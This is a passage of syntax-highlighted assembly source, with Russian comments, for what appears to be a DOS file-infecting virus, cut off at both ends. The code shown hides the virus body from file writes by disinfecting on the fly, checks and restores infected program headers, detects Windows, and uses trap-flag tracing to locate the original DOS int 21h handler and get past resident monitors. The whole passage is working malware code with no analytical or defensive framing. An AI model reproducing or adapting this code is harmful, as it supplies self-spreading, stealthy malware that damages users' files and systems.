        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">nowrite</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">handlecheck</span><span class="sc0">         </span><span class="sc1">; дисковый файл?</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">nowrite</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">inf?</span><span class="sc0">                </span><span class="sc1">; инфицирован?</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">nowrite</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seeksave</span><span class="sc0">            </span><span class="sc1">; сохраняем указатель записи</span><span class="sc0">

        </span><span class="sc6">pusha</span><span class="sc0">                       </span><span class="sc1">; извратимся на регистрами</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">load_original</span><span class="sc0">       </span><span class="sc1">; оригинальное начало -&gt; в буфер</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seek2bof</span><span class="sc0">            </span><span class="sc1">; указатель -&gt; в начало файла</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">              </span><span class="sc1">; пишем оригинальное начало файла</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">28</span><span class="sc0">               </span><span class="sc1">; 28 байт из буфера</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">buffer</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">disfail</span><span class="sc0">             </span><span class="sc1">; ошибка? ну тогда при записи того,</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">               </span><span class="sc1">; чего просят ошибка будет тоже!</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">disfail</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">               </span><span class="sc1">; двигаемся к началу тела вируса</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,-</span><span class="sc5">vsize</span><span class="sc0">           </span><span class="sc1">; или концу зараженной программы</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seekfrom_eof</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">              </span><span class="sc1">; кастрируем файл (удаляем тело вируса</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">               </span><span class="sc1">; из вирусоносителя</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">68h</span><span class="sc0">              </span><span class="sc1">; пишем все данные на диск</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
 </span><span class="sc5">disfail</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">restoreseek</span><span class="sc0">         </span><span class="sc1">; восстанавливаем lseek</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                  </span><span class="sc1">; восстанавливаем регистры</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
 </span><span class="sc5">nowrite</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exithandler</span><span class="sc0">         </span><span class="sc1">; выходим</span><span class="sc0">

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
</span><span class="sc1">; Ah=18h,AL=0DDh: TSR test</span><span class="sc0">
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 </span><span class="sc5">tsrtest</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0ddh</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">tsrexit</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0303h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">ireturn</span><span class="sc0">

 </span><span class="sc5">tsrexit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exithandler</span><span class="sc0">

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
</span><span class="sc1">; ════════════════════════&gt; S·U·B·R·O·U·T·I·N·E·S &lt;═════════════════════════</span><span class="sc0">
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
</span><span class="sc1">; подпрограмма для проверки файла (bx=handle) на зараженность</span><span class="sc0">
</span><span class="sc1">; cf=1 если заражен</span><span class="sc0">
 </span><span class="sc5">inf?</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">pusha</span><span class="sc0">                    </span><span class="sc1">; сохранить в стеке регистры</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seeksave</span><span class="sc0">         </span><span class="sc1">; сохраняем позицию lseek</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; двигаемся к началу подпрограммы "extra"</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,-(</span><span class="sc5">eov</span><span class="sc4">-</span><span class="sc5">extra</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">; (по ней будем сверять)</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seekfrom_eof</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">           </span><span class="sc1">; читаем подпрограмму в "buffer"</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">eov</span><span class="sc4">-</span><span class="sc5">extra</span><span class="sc4">)</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">buffer</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">restoreseek</span><span class="sc0">      </span><span class="sc1">; восстановить позицию lseek</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">            </span><span class="sc1">; все прочиталось?</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">not_infected</span><span class="sc0">

       </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">buffer</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">extra</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">eov</span><span class="sc4">-</span><span class="sc5">extra</span><span class="sc0">
       </span><span class="sc6">cld</span><span class="sc0">
       </span><span class="sc6">repe</span><span class="sc0">     </span><span class="sc6">cmpsb</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0">      </span><span class="sc5">not_infected</span><span class="sc0">

 </span><span class="sc5">infected</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">stc</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
       </span><span class="sc6">popa</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">

 </span><span class="sc5">not_infected</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">clc</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">infected</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc1">; подпрограмма для выкапывания оригинального начала зараженной программы</span><span class="sc0">
</span><span class="sc1">; на входе: bx - handler</span><span class="sc0">
</span><span class="sc1">; на выходе: "buffer" с оригинальным расшифрованным началом</span><span class="sc0">
</span><span class="sc1">; сохраняет позицию lseek в файле</span><span class="sc0">

 </span><span class="sc5">load_original</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc5">pushall</span><span class="sc0">                 </span><span class="sc1">; save all 16-bit registers (exc. SP)</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">           </span><span class="sc1">; remember the current lseek position</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seekfrom_cur</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; seek to the virus start (-vsize bytes</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,-</span><span class="sc5">vsize</span><span class="sc0">        </span><span class="sc1">; from end of file)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seekfrom_eof</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">           </span><span class="sc1">; read virus body to the buffer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">vsize</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">buffer</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">            </span><span class="sc1">; восстанавливаем позицию lseek в</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seekfrom_bof</span><span class="sc0">     </span><span class="sc1">; зараженной программе</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">buffer</span><span class="sc4">+(</span><span class="sc5">cr_ret</span><span class="sc4">-</span><span class="sc5">ksenia</span><span class="sc4">)],</span><span class="sc2">0cbh</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">buffer</span><span class="sc0">
        </span><span class="sc6">cwd</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">crypt</span><span class="sc4">-</span><span class="sc5">ksenia</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">retc</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">

 </span><span class="sc5">retc</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc5">buffer</span><span class="sc4">+(</span><span class="sc5">original</span><span class="sc4">-</span><span class="sc5">ksenia</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">buffer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">28</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc5">popall</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; Хирургическая обработка прерывания int 21h</span><span class="sc0">
 </span><span class="sc5">cr21z</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">pusha</span><span class="sc0">                    </span><span class="sc1">; сохранить регистры</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

       </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">70h</span><span class="sc0">
       </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc4">+</span><span class="sc2">70h</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">splint</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">25h</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">tsr</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

       </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">original</span><span class="sc4">,</span><span class="sc2">0ffffh</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">my_int</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1600h</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">2fh</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">no_win</span><span class="sc0">

 </span><span class="sc5">my_int</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3521h</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">win21</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">win21</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2521h</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">win_trick</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">motherfucker</span><span class="sc0">

 </span><span class="sc5">no_win</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">30h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">         </span><span class="sc1">; найти оригинальный вектор прерывания</span><span class="sc0">
 </span><span class="sc5">nextchain</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">; int 21h</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">0eah</span><span class="sc0">       </span><span class="sc1">; прямой дальний джамп?</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">another_way</span><span class="sc0">
       </span><span class="sc6">lds</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; загрузить в ds:si ссылку джампа</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">9090h</span><span class="sc0">      </span><span class="sc1">; там находятся 2 nop'а?</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">nextchain</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">32h</span><span class="sc0">                   </span><span class="sc1">; а если взять пораньше?</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">9090h</span><span class="sc0">      </span><span class="sc1">; nop/nop</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">gotreal</span><span class="sc0">                  </span><span class="sc1">; call far [....]</span><span class="sc0">

 </span><span class="sc5">another_way</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">2e1eh</span><span class="sc0">      </span><span class="sc1">; push ds</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">motherfucker</span><span class="sc0">             </span><span class="sc1">; cs:[...]?</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">25h</span><span class="sc0">                   </span><span class="sc1">; а дальше?</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">80fah</span><span class="sc0">      </span><span class="sc1">; cli</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">gotreal</span><span class="sc0">                  </span><span class="sc1">; cmp ah,[..]</span><span class="sc0">

 </span><span class="sc5">motherfucker</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc1">; че то меня понесло...</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
       </span><span class="sc6">lds</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">84h</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; ладно, хуй с ним</span><span class="sc0">
 </span><span class="sc5">gotreal</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">io21</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">       </span><span class="sc1">; засовываем че нашли в ячейку памяти</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">io21</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; читаем 2 первые байта обработчика</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">prev2</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">; сохраняем их</span><span class="sc0">

       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3501h</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">io1</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">io1</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2501h</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">trace</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

       </span><span class="sc6">pushf</span><span class="sc0">                    </span><span class="sc1">; сохранить в стеке адрес</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">               </span><span class="sc1">; возврата</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">trace_post</span><span class="sc0">

       </span><span class="sc6">pushf</span><span class="sc0">                    </span><span class="sc1">; сохранить в стеке флаги со</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">               </span><span class="sc1">; включенным битом трассировки</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">io21</span><span class="sc0">     </span><span class="sc1">; и загрузить адрес 21-го обработчика</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">30h</span><span class="sc0">             </span><span class="sc1">; невинная функция dos</span><span class="sc0">
       </span><span class="sc6">iret</span><span class="sc0">                       </span><span class="sc1">; перейти в режим трассировки</span><span class="sc0">

 </span><span class="sc5">trace_post</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">            </span><span class="sc1">; здеся мы кончили...........</span><span class="sc0">
       </span><span class="sc6">popa</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">

 </span><span class="sc5">trace</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">        </span><span class="sc1">; трассировка 21-го</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">io21</span><span class="sc0">       </span><span class="sc1">; взять смещение</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">        </span><span class="sc1">; выполнились ли первые</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">nextcmd</span><span class="sc0">          </span><span class="sc1">; два байта обработчика?</span><span class="sc0">

       </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">],</span><span class="sc2">0feffh</span><span class="sc0">  </span><span class="sc1">; убрать флаг трассировки</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; считать адрес следующей инструкции</span><span class="sc0">
